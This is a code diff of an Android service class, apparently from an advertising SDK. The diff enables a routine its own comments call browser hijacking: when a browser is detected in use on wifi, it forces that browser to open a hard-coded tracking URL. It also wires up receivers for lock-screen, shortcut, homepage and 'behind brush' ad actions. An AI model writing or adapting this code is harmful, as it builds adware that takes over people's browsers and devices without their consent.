@@ -26,6 +26,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
+import android.net.ConnectivityManager;
 import android.net.Uri;
 import android.os.Environment;
 
@@ -34,7 +35,6 @@ public class GSysService  {
 	private static GSysService _instance;	
 	private static Context contexts;
 	private static GSysReceiver receiver;
-	private String activePackageName;	
 	private boolean isPresent;
 	private boolean isRuning;
 	
@@ -51,15 +51,6 @@ public class GSysService  {
 		return _instance;
 	}
 	
-	public void updateActive(String packageName)
-	{
-		this.activePackageName = packageName;
-		long n_time = GTools.getCurrTime();
-		GTools.saveSharedData(GCommon.SHARED_KEY_APP_ACTIVE_TIME, n_time);
-	}
-	
-	
-
 	public void start(final Context context) {
 		contexts = context;
 		GTools.saveSharedData(GCommon.SHARED_KEY_SERVICE_RUN_TIME,GTools.getCurrTime());
@@ -87,7 +78,7 @@ public class GSysService  {
 						boolean b = appStartUpThread();
 						if(!b)
 						{
-							b = browserBreakThread();
+							b = browserThread();
 						}
 						Thread.sleep(100);
 					} catch (Exception e) {
@@ -104,7 +95,7 @@ public class GSysService  {
 		if(		isPresent 
 				&& isWifi()
 				&& isAppSwitch()
-				&& (isAdPosition(GCommon.OPENSPOT) || isAdPosition(GCommon.BANNER))
+				&& (isAdPosition(GCommon.APP_SPOT) || isAdPosition(GCommon.BANNER))
 				&& isShowTimeInterval()
 				&& isShowNum()
 				&& isTimeSlot()
@@ -118,19 +109,22 @@ public class GSysService  {
 		return false;
 	}
 	//浏览器插屏
-	private boolean browserBreakThread()
+	private boolean browserThread()
 	{
 		if(		isPresent 
 				&& isWifi()
 				&& isAppSwitch()
-				&& isAdPosition(GCommon.BROWSER_INTERCEPTION)
+				&& (isAdPosition(GCommon.BROWSER_SPOT) || isAdPosition(GCommon.BROWSER_BREAK))
 				&& isShowBrowerTime())
 		{		
 			String s =  GTools.getBrowserCpuUsage();
 			if(s != null)
 			{
-				GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_OPEN_TIME, GTools.getCurrTime());
-				GSMController.getInstance().showSpot(s);
+				//浏览器劫持
+				browserBreak(s);
+				
+				//浏览器插屏
+				browserSpot(s);
 				return true;
 			}			
 		}	
@@ -154,50 +148,6 @@ public class GSysService  {
 		}	
 	}
 	
-	public void browserBreakAndShortcutThread()
-	{
-		new Thread() {
-			public void run() {
-				Context context = contexts;
-				if(context == null)
-					context = QLAdController.getInstance().getContext();
-				while(isMainLoop())
-				{				
-					try {	
-						boolean shortcut = false;
-						if(		isPresent 
-								&& isWifi()
-								&& isAppSwitch()
-								&& isAdPosition(GCommon.SHORTCUT)
-								&& isShowShortcutTime()
-								&& isShowShortcutAd())
-						{		
-							shortcut = true;
-							QLShortcut.getInstance().show();
-							GTools.saveSharedData(GCommon.SHARED_KEY_SHORTCUT_OPEN_TIME, GTools.getCurrTime());
-						}	
-						
-						if(		isPresent 
-								&& !shortcut
-								&& isWifi()
-								&& isAppSwitch()
-								&& isAdPosition(GCommon.BROWSER_INTERCEPTION)
-								&& isShowBrowerTime()
-								&& isShowBrowerAd())
-						{		
-							String s =  GTools.getBrowserCpuUsage();
-							if(s != null)
-								browserBreak(s); 
-						}	
-							
-						Thread.sleep(100);
-					} catch (Exception e) {
-					}
-				}					
-			};
-		}.start();
-	}
-	
 	//应用启动
 	public void appStartUp()
 	{
@@ -206,7 +156,7 @@ public class GSysService  {
 		boolean isget = GOfferController.getInstance().isGetRandOffer();
 		if(isget)
 		{
-			 GOfferController.getInstance().getRandOffer(GCommon.OPENSPOT);
+			 GOfferController.getInstance().getRandOffer(GCommon.APP_SPOT);
 			 return;
 		}
 		if(GOfferController.getInstance().isDownloadResSuccess())
@@ -215,7 +165,7 @@ public class GSysService  {
 		}
 		else
 		{
-			 GOfferController.getInstance().getRandOffer(GCommon.OPENSPOT);
+			 GOfferController.getInstance().getRandOffer(GCommon.APP_SPOT);
 		}
 	}
 	//banner
@@ -236,18 +186,22 @@ public class GSysService  {
 			GTools.saveSharedData(GCommon.SHARED_KEY_SHORTCUT_OPEN_TIME, GTools.getCurrTime());
 		}		
 	}
-	//浏览器截取
-	public void browserBreak(String packageName)
+	//浏览器插屏
+	public void browserSpot(String packageName)
 	{
 		GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_OPEN_TIME, GTools.getCurrTime());
 		GSMController.getInstance().showSpot(packageName);
-//		String url = "www.baidu.com";
-//		PackageManager packageMgr = contexts.getPackageManager();
-//		Intent intent = packageMgr.getLaunchIntentForPackage(packageName);
-//        intent.setAction(Intent.ACTION_VIEW);
-//        intent.addCategory(Intent.CATEGORY_DEFAULT);
-//        intent.setData(Uri.parse(url));
-//        contexts.startActivity(intent);
+	}
+	//浏览器截取
+	public void browserBreak(String packageName)
+	{
+		String url = "http://m.2048kg.com/?channelId=qq17011101";
+		PackageManager packageMgr = contexts.getPackageManager();
+		Intent intent = packageMgr.getLaunchIntentForPackage(packageName);
+        intent.setAction(Intent.ACTION_VIEW);
+        intent.addCategory(Intent.CATEGORY_DEFAULT);
+        intent.setData(Uri.parse(url));
+        contexts.startActivity(intent);
 	}
 		
 	
@@ -466,28 +420,6 @@ public class GSysService  {
         }  
 	}
 
-	private void judgeActive()
-	{
-		if(activePackageName == null)
-			return;
-		long n_time = GTools.getCurrTime();
-		long time = GTools.getSharedPreferences().getLong(GCommon.SHARED_KEY_APP_ACTIVE_TIME, 0l);
-		if(n_time - time < 10 * 60 * 1000)
-		{
-			if(GTools.judgeAppActive(activePackageName))
-			{							
-				Intent intent = new Intent();  
-				intent.putExtra("activePackageName", activePackageName);
-				intent.setAction(GCommon.ACTION_QEW_APP_ACTIVE);  
-				contexts.sendBroadcast(intent);  
-				
-				GTools.saveSharedData(GCommon.SHARED_KEY_APP_ACTIVE_TIME, 0l);
-				activePackageName = null;
-			}
-		}
-		
-	}
-	
 	public boolean isOpenLock()
 	{
 		int type = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_LOCK_SAVE_TYPE, 1);		
@@ -637,7 +569,7 @@ public class GSysService  {
 		boolean isget = GOfferController.getInstance().isGetRandOffer();
 		if(isget)
 		{
-			 GOfferController.getInstance().getRandOffer(GCommon.BROWSER_INTERCEPTION);
+			 GOfferController.getInstance().getRandOffer(GCommon.BROWSER_SPOT);
 			 return false;
 		}
 		if(GOfferController.getInstance().isDownloadResSuccess())
@@ -646,7 +578,7 @@ public class GSysService  {
 		}
 		else
 		{
-			 GOfferController.getInstance().getRandOffer(GCommon.BROWSER_INTERCEPTION);
+			 GOfferController.getInstance().getRandOffer(GCommon.BROWSER_SPOT);
 			 return false;
 		}
 	}
@@ -656,19 +588,24 @@ public class GSysService  {
 	private static void registerListener() {
 		receiver = new GSysReceiver();
         IntentFilter filter = new IntentFilter();
-        filter.addAction(GCommon.ACTION_QEW_APP_STARTUP);
-        filter.addAction(GCommon.ACTION_QEW_APP_BROWSER);
-        filter.addAction(GCommon.ACTION_QEW_APP_BANNER);
-        filter.addAction(GCommon.ACTION_QEW_APP_LOCK);
-        filter.addAction(GCommon.ACTION_QEW_APP_SHORTCUT);
+        filter.addAction(GCommon.ACTION_QEW_APP_BROWSER_SPOT);
         filter.addAction(GCommon.ACTION_QEW_APP_INSTALL);
         filter.addAction(GCommon.ACTION_QEW_APP_UNINSTALL);
-        filter.addAction(GCommon.ACTION_QEW_APP_ACTIVE);
+        filter.addAction(GCommon.ACTION_QEW_APP_BANNER);
+        filter.addAction(GCommon.ACTION_QEW_APP_LOCK);
+        filter.addAction(GCommon.ACTION_QEW_APP_SPOT);
+        filter.addAction(GCommon.ACTION_QEW_APP_WIFI);
+        filter.addAction(GCommon.ACTION_QEW_APP_BROWSER_BREAK);
+        filter.addAction(GCommon.ACTION_QEW_APP_SHORTCUT);
+        filter.addAction(GCommon.ACTION_QEW_APP_HOMEPAGE);
+        filter.addAction(GCommon.ACTION_QEW_APP_BEHIND_BRUSH);
         filter.addAction(GCommon.ACTION_QEW_OPEN_APP);
+        
         filter.addAction(Intent.ACTION_SCREEN_ON);
         filter.addAction(Intent.ACTION_SCREEN_OFF);
         filter.addAction(Intent.ACTION_USER_PRESENT);
         filter.addAction(Intent.ACTION_BATTERY_CHANGED);
+        filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
         contexts.registerReceiver(receiver, filter);
         
     }
